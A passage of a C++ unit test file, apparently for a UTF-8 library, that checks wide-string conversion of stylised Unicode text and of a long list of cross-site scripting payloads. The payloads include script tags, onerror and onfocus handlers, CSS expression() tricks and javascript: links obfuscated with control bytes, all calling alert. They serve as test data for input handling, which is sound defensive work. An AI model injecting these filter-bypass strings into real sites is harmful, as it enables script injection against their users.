	EXPECT_STREQ(L"\xFF34\xFF48\xFF45 \xFF51\xFF55\xFF49\xFF43\xFF4B \xFF42\xFF52\xFF4F\xFF57\xFF4E \xFF46\xFF4F\xFF58 \xFF4A\xFF55\xFF4D\xFF50\xFF53 \xFF4F\xFF56\xFF45\xFF52 \xFF54\xFF48\xFF45 \xFF4C\xFF41\xFF5A\xFF59 \xFF44\xFF4F\xFF47", helpers::wide(ReadSection(6043, 113)).c_str());
	EXPECT_STREQ(L"\xD835\xDC13\xD835\xDC21\xD835\xDC1E \xD835\xDC2A\xD835\xDC2E\xD835\xDC22\xD835\xDC1C\xD835\xDC24 \xD835\xDC1B\xD835\xDC2B\xD835\xDC28\xD835\xDC30\xD835\xDC27 \xD835\xDC1F\xD835\xDC28\xD835\xDC31 \xD835\xDC23\xD835\xDC2E\xD835\xDC26\xD835\xDC29\xD835\xDC2C \xD835\xDC28\xD835\xDC2F\xD835\xDC1E\xD835\xDC2B \xD835\xDC2D\xD835\xDC21\xD835\xDC1E \xD835\xDC25\xD835\xDC1A\xD835\xDC33\xD835\xDC32 \xD835\xDC1D\xD835\xDC28\xD835\xDC20", helpers::wide(ReadSection(6157, 148)).c_str());
	EXPECT_STREQ(L"\xD835\xDD7F\xD835\xDD8D\xD835\xDD8A \xD835\xDD96\xD835\xDD9A\xD835\xDD8E\xD835\xDD88\xD835\xDD90 \xD835\xDD87\xD835\xDD97\xD835\xDD94\xD835\xDD9C\xD835\xDD93 \xD835\xDD8B\xD835\xDD94\xD835\xDD9D \xD835\xDD8F\xD835\xDD9A\xD835\xDD92\xD835\xDD95\xD835\xDD98 \xD835\xDD94\xD835\xDD9B\xD835\xDD8A\xD835\xDD97 \xD835\xDD99\xD835\xDD8D\xD835\xDD8A \xD835\xDD91\xD835\xDD86\xD835\xDD9F\xD835\xDD9E \xD835\xDD89\xD835\xDD94\xD835\xDD8C", helpers::wide(ReadSection(6306, 148)).c_str());
	EXPECT_STREQ(L"\xD835\xDC7B\xD835\xDC89\xD835\xDC86 \xD835\xDC92\xD835\xDC96\xD835\xDC8A\xD835\xDC84\xD835\xDC8C \xD835\xDC83\xD835\xDC93\xD835\xDC90\xD835\xDC98\xD835\xDC8F \xD835\xDC87\xD835\xDC90\xD835\xDC99 \xD835\xDC8B\xD835\xDC96\xD835\xDC8E\xD835\xDC91\xD835\xDC94 \xD835\xDC90\xD835\xDC97\xD835\xDC86\xD835\xDC93 \xD835\xDC95\xD835\xDC89\xD835\xDC86 \xD835\xDC8D\xD835\xDC82\xD835\xDC9B\xD835\xDC9A \xD835\xDC85\xD835\xDC90\xD835\xDC88", helpers::wide(ReadSection(6455, 148)).c_str());
	EXPECT_STREQ(L"\xD835\xDCE3\xD835\xDCF1\xD835\xDCEE \xD835\xDCFA\xD835\xDCFE\xD835\xDCF2\xD835\xDCEC\xD835\xDCF4 \xD835\xDCEB\xD835\xDCFB\xD835\xDCF8\xD835\xDD00\xD835\xDCF7 \xD835\xDCEF\xD835\xDCF8\xD835\xDD01 \xD835\xDCF3\xD835\xDCFE\xD835\xDCF6\xD835\xDCF9\xD835\xDCFC \xD835\xDCF8\xD835\xDCFF\xD835\xDCEE\xD835\xDCFB \xD835\xDCFD\xD835\xDCF1\xD835\xDCEE \xD835\xDCF5\xD835\xDCEA\xD835\xDD03\xD835\xDD02 \xD835\xDCED\xD835\xDCF8\xD835\xDCF0", helpers::wide(ReadSection(6604, 148)).c_str());
	EXPECT_STREQ(L"\xD835\xDD4B\xD835\xDD59\xD835\xDD56 \xD835\xDD62\xD835\xDD66\xD835\xDD5A\xD835\xDD54\xD835\xDD5C \xD835\xDD53\xD835\xDD63\xD835\xDD60\xD835\xDD68\xD835\xDD5F \xD835\xDD57\xD835\xDD60\xD835\xDD69 \xD835\xDD5B\xD835\xDD66\xD835\xDD5E\xD835\xDD61\xD835\xDD64 \xD835\xDD60\xD835\xDD67\xD835\xDD56\xD835\xDD63 \xD835\xDD65\xD835\xDD59\xD835\xDD56 \xD835\xDD5D\xD835\xDD52\xD835\xDD6B\xD835\xDD6A \xD835\xDD55\xD835\xDD60\xD835\xDD58", helpers::wide(ReadSection(6753, 148)).c_str());
	EXPECT_STREQ(L"\xD835\xDE83\xD835\xDE91\xD835\xDE8E \xD835\xDE9A\xD835\xDE9E\xD835\xDE92\xD835\xDE8C\xD835\xDE94 \xD835\xDE8B\xD835\xDE9B\xD835\xDE98\xD835\xDEA0\xD835\xDE97 \xD835\xDE8F\xD835\xDE98\xD835\xDEA1 \xD835\xDE93\xD835\xDE9E\xD835\xDE96\xD835\xDE99\xD835\xDE9C \xD835\xDE98\xD835\xDE9F\xD835\xDE8E\xD835\xDE9B \xD835\xDE9D\xD835\xDE91\xD835\xDE8E \xD835\xDE95\xD835\xDE8A\xD835\xDEA3\xD835\xDEA2 \xD835\xDE8D\xD835\xDE98\xD835\xDE90", helpers::wide(ReadSection(6902, 148)).c_str());
	EXPECT_STREQ(L"\x24AF\x24A3\x24A0 \x24AC\x24B0\x24A4\x249E\x24A6 \x249D\x24AD\x24AA\x24B2\x24A9 \x24A1\x24AA\x24B3 \x24A5\x24B0\x24A8\x24AB\x24AE \x24AA\x24B1\x24A0\x24AD \x24AF\x24A3\x24A0 \x24A7\x249C\x24B5\x24B4 \x249F\x24AA\x24A2", helpers::wide(ReadSection(7051, 113)).c_str());
#elif UTF8_WCHAR_UTF32
	EXPECT_STREQ(L"\xFF34\xFF48\xFF45 \xFF51\xFF55\xFF49\xFF43\xFF4B \xFF42\xFF52\xFF4F\xFF57\xFF4E \xFF46\xFF4F\xFF58 \xFF4A\xFF55\xFF4D\xFF50\xFF53 \xFF4F\xFF56\xFF45\xFF52 \xFF54\xFF48\xFF45 \xFF4C\xFF41\xFF5A\xFF59 \xFF44\xFF4F\xFF47", helpers::wide(ReadSection(6043, 113)).c_str());
	EXPECT_STREQ(L"\x1D413\x1D421\x1D41E \x1D42A\x1D42E\x1D422\x1D41C\x1D424 \x1D41B\x1D42B\x1D428\x1D430\x1D427 \x1D41F\x1D428\x1D431 \x1D423\x1D42E\x1D426\x1D429\x1D42C \x1D428\x1D42F\x1D41E\x1D42B \x1D42D\x1D421\x1D41E \x1D425\x1D41A\x1D433\x1D432 \x1D41D\x1D428\x1D420", helpers::wide(ReadSection(6157, 148)).c_str());
	EXPECT_STREQ(L"\x1D57F\x1D58D\x1D58A \x1D596\x1D59A\x1D58E\x1D588\x1D590 \x1D587\x1D597\x1D594\x1D59C\x1D593 \x1D58B\x1D594\x1D59D \x1D58F\x1D59A\x1D592\x1D595\x1D598 \x1D594\x1D59B\x1D58A\x1D597 \x1D599\x1D58D\x1D58A \x1D591\x1D586\x1D59F\x1D59E \x1D589\x1D594\x1D58C", helpers::wide(ReadSection(6306, 148)).c_str());
	EXPECT_STREQ(L"\x1D47B\x1D489\x1D486 \x1D492\x1D496\x1D48A\x1D484\x1D48C \x1D483\x1D493\x1D490\x1D498\x1D48F \x1D487\x1D490\x1D499 \x1D48B\x1D496\x1D48E\x1D491\x1D494 \x1D490\x1D497\x1D486\x1D493 \x1D495\x1D489\x1D486 \x1D48D\x1D482\x1D49B\x1D49A \x1D485\x1D490\x1D488", helpers::wide(ReadSection(6455, 148)).c_str());
	EXPECT_STREQ(L"\x1D4E3\x1D4F1\x1D4EE \x1D4FA\x1D4FE\x1D4F2\x1D4EC\x1D4F4 \x1D4EB\x1D4FB\x1D4F8\x1D500\x1D4F7 \x1D4EF\x1D4F8\x1D501 \x1D4F3\x1D4FE\x1D4F6\x1D4F9\x1D4FC \x1D4F8\x1D4FF\x1D4EE\x1D4FB \x1D4FD\x1D4F1\x1D4EE \x1D4F5\x1D4EA\x1D503\x1D502 \x1D4ED\x1D4F8\x1D4F0", helpers::wide(ReadSection(6604, 148)).c_str());
	EXPECT_STREQ(L"\x1D54B\x1D559\x1D556 \x1D562\x1D566\x1D55A\x1D554\x1D55C \x1D553\x1D563\x1D560\x1D568\x1D55F \x1D557\x1D560\x1D569 \x1D55B\x1D566\x1D55E\x1D561\x1D564 \x1D560\x1D567\x1D556\x1D563 \x1D565\x1D559\x1D556 \x1D55D\x1D552\x1D56B\x1D56A \x1D555\x1D560\x1D558", helpers::wide(ReadSection(6753, 148)).c_str());
	EXPECT_STREQ(L"\x1D683\x1D691\x1D68E \x1D69A\x1D69E\x1D692\x1D68C\x1D694 \x1D68B\x1D69B\x1D698\x1D6A0\x1D697 \x1D68F\x1D698\x1D6A1 \x1D693\x1D69E\x1D696\x1D699\x1D69C \x1D698\x1D69F\x1D68E\x1D69B \x1D69D\x1D691\x1D68E \x1D695\x1D68A\x1D6A3\x1D6A2 \x1D68D\x1D698\x1D690", helpers::wide(ReadSection(6902, 148)).c_str());
	EXPECT_STREQ(L"\x24AF\x24A3\x24A0 \x24AC\x24B0\x24A4\x249E\x24A6 \x249D\x24AD\x24AA\x24B2\x24A9 \x24A1\x24AA\x24B3 \x24A5\x24B0\x24A8\x24AB\x24AE \x24AA\x24B1\x24A0\x24AD \x24AF\x24A3\x24A0 \x24A7\x249C\x24B5\x24B4 \x249F\x24AA\x24A2", helpers::wide(ReadSection(7051, 113)).c_str());
#endif
}

TEST_F(NaughtyStrings, ScriptInjection)
{
	EXPECT_STREQ(L"<script>alert(123)</script>", helpers::wide(ReadSection(7276, 27)).c_str());
	EXPECT_STREQ(L"&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;", helpers::wide(ReadSection(7304, 50)).c_str());
	EXPECT_STREQ(L"<img src=x onerror=alert(123) />", helpers::wide(ReadSection(7355, 32)).c_str());
	EXPECT_STREQ(L"<svg><script>123<1>alert(123)</script> ", helpers::wide(ReadSection(7388, 39)).c_str());
	EXPECT_STREQ(L"\"><script>alert(123)</script>", helpers::wide(ReadSection(7428, 29)).c_str());
	EXPECT_STREQ(L"'><script>alert(123)</script>", helpers::wide(ReadSection(7458, 29)).c_str());
	EXPECT_STREQ(L"><script>alert(123)</script>", helpers::wide(ReadSection(7488, 28)).c_str());
	EXPECT_STREQ(L"</script><script>alert(123)</script>", helpers::wide(ReadSection(7517, 36)).c_str());
	EXPECT_STREQ(L"< / script >< script >alert(123)< / script >", helpers::wide(ReadSection(7554, 44)).c_str());
	EXPECT_STREQ(L" onfocus=JaVaSCript:alert(123) autofocus ", helpers::wide(ReadSection(7599, 41)).c_str());
	EXPECT_STREQ(L"\" onfocus=JaVaSCript:alert(123) autofocus ", helpers::wide(ReadSection(7641, 42)).c_str());
	EXPECT_STREQ(L"' onfocus=JaVaSCript:alert(123) autofocus ", helpers::wide(ReadSection(7684, 42)).c_str());
	EXPECT_STREQ(L"\xFF1C" L"script\xFF1E" L"alert(123)\xFF1C/script\xFF1E", helpers::wide(ReadSection(7727, 35)).c_str());
	EXPECT_STREQ(L"<sc<script>ript>alert(123)</sc</script>ript>", helpers::wide(ReadSection(7763, 44)).c_str());
	EXPECT_STREQ(L"--><script>alert(123)</script>", helpers::wide(ReadSection(7808, 30)).c_str());
	EXPECT_STREQ(L"\";alert(123);t=\"", helpers::wide(ReadSection(7839, 16)).c_str());
	EXPECT_STREQ(L"';alert(123);t='", helpers::wide(ReadSection(7856, 16)).c_str());
	EXPECT_STREQ(L"JavaSCript:alert(123)", helpers::wide(ReadSection(7873, 21)).c_str());
	EXPECT_STREQ(L";alert(123);", helpers::wide(ReadSection(7895, 12)).c_str());
	EXPECT_STREQ(L"src=JaVaSCript:prompt(132)", helpers::wide(ReadSection(7908, 26)).c_str());
	EXPECT_STREQ(L"\"><script>alert(123);</script x=\"", helpers::wide(ReadSection(7935, 33)).c_str());
	EXPECT_STREQ(L"'><script>alert(123);</script x='", helpers::wide(ReadSection(7969, 33)).c_str());
	EXPECT_STREQ(L"><script>alert(123);</script x=", helpers::wide(ReadSection(8003, 31)).c_str());
	EXPECT_STREQ(L"\" autofocus onkeyup=\"javascript:alert(123)", helpers::wide(ReadSection(8035, 42)).c_str());
	EXPECT_STREQ(L"' autofocus onkeyup='javascript:alert(123)", helpers::wide(ReadSection(8078, 42)).c_str());
	EXPECT_STREQ(L"<script\\x20type=\"text/javascript\">javascript:alert(1);</script>", helpers::wide(ReadSection(8121, 63)).c_str());
	EXPECT_STREQ(L"<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>", helpers::wide(ReadSection(8185, 63)).c_str());
	EXPECT_STREQ(L"<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>", helpers::wide(ReadSection(8249, 63)).c_str());
	EXPECT_STREQ(L"<script\\x09type=\"text/javascript\">javascript:alert(1);</script>", helpers::wide(ReadSection(8313, 63)).c_str());
	EXPECT_STREQ(L"<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>", helpers::wide(ReadSection(8377, 63)).c_str());
	EXPECT_STREQ(L"<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>", helpers::wide(ReadSection(8441, 63)).c_str());
	EXPECT_STREQ(L"<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>", helpers::wide(ReadSection(8505, 63)).c_str());
	EXPECT_STREQ(L"'`\"><\\x3Cscript>javascript:alert(1)</script>        ", helpers::wide(ReadSection(8569, 52)).c_str());
	EXPECT_STREQ(L"'`\"><\\x00script>javascript:alert(1)</script>", helpers::wide(ReadSection(8622, 44)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(8667, 55)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF", helpers::wide(ReadSection(8723, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF", helpers::wide(ReadSection(8780, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(8837, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(8894, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(8951, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9008, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9065, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9130, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9195, 60)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9256, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9321, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9386, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9443, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9500, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9565, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9630, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9687, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9752, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9809, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9874, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(9939, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(10004, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(10069, 56)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(10126, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(10191, 64)).c_str());
	EXPECT_STREQ(L"ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF", helpers::wide(ReadSection(10256, 64)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10321, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10393, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10465, 75)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10541, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10613, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10693, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10765, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10837, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10917, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(10997, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11077, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11149, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11221, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11293, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11365, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11437, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11509, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11589, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11661, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11733, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11805, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11885, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(11957, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12029, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12109, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12181, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12261, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12333, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12413, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12485, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12565, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12645, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12717, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12789, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12861, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(12941, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13021, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13101, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13173, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13245, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13317, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13389, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13461, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13541, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13613, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13685, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13757, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13829, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13909, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(13989, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(14061, 79)).c_str());
	EXPECT_STREQ(L"<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(14141, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(14213, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(14285, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(14357, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(14429, 71)).c_str());
	EXPECT_STREQ(L"<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>", helpers::wide(ReadSection(14501, 71)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>", helpers::wide(ReadSection(14573, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>", helpers::wide(ReadSection(14625, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>", helpers::wide(ReadSection(14677, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>", helpers::wide(ReadSection(14729, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>", helpers::wide(ReadSection(14781, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>", helpers::wide(ReadSection(14833, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>", helpers::wide(ReadSection(14885, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>", helpers::wide(ReadSection(14937, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>", helpers::wide(ReadSection(14989, 51)).c_str());
	EXPECT_STREQ(L"`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>", helpers::wide(ReadSection(15041, 51)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x3Bjavascript:alert(1)</script>", helpers::wide(ReadSection(15093, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x0Djavascript:alert(1)</script>", helpers::wide(ReadSection(15138, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>", helpers::wide(ReadSection(15183, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x81javascript:alert(1)</script>", helpers::wide(ReadSection(15236, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x84javascript:alert(1)</script>", helpers::wide(ReadSection(15289, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE3\\x80\\x80javascript:alert(1)</script>", helpers::wide(ReadSection(15342, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x09javascript:alert(1)</script>", helpers::wide(ReadSection(15395, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x89javascript:alert(1)</script>", helpers::wide(ReadSection(15440, 52)).c_str());
